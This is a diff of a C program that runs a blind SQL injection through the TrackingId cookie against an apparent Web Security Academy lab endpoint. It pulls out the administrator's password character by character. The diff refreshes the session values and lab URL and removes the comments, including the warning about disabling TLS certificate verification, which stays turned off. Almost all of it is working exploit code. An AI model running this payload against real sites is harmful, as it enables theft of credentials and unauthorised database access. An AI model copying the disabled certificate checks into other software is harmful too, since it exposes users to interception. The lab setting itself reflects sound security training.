@@ -41,10 +41,8 @@ int main() {
 
     if (!curl) return 1;
 
-    /* set write callback so we capture responses into chunk */
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-    /* for testing lab endpoints that may use self-signed certs: disable peer verification
-       (NOT recommended for production) */
+    
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
@@ -58,13 +56,13 @@ int main() {
             usleep(50000); // unsigned in => 50ms
             char trackingId[512];
             snprintf(trackingId, sizeof(trackingId),
-                "TrackingId=JsWipToajZ8pRY0v'+and+(select+substring(password, %d, 1)+from+users+where+username='administrator')+=+'%c'--", j, carac_list[i]);
+                "TrackingId=ZqX1Yq4RoYtVJz7D'+and+(select+substring(password, %d, 1)+from+users+where+username='administrator')+=+'%c'--", j, carac_list[i]);
 
             char cookieHeader[600];
             snprintf(cookieHeader, sizeof(cookieHeader),
                 "Cookie: %s; session=%s",
                 trackingId,
-                "s21IEYIYd0hbpTAF0o6IOiWo3nV7iSAc"
+                "5wnGANGV88XX6qKFx2kZbEwuaBbQfRlG"
             );
 
             struct curl_slist *headers = NULL;
@@ -75,7 +73,7 @@ int main() {
             chunk.size = 0;
             chunk.data[0] = '\0';
 
-            curl_easy_setopt(curl, CURLOPT_URL, "https://0a02002003b095f180300804001a00e7.web-security-academy.net/filter");
+            curl_easy_setopt(curl, CURLOPT_URL, "https://0acb00ed03def30980b16c66007000e2.web-security-academy.net/filter");
             curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
             curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
 
@@ -108,8 +106,7 @@ int main() {
     for (int i = 0; i < 20; i++){
         printf("%c", result[i]);
     }
+    printf("\n");
 
     curl_easy_cleanup(curl);
 }
-
-// 3m49
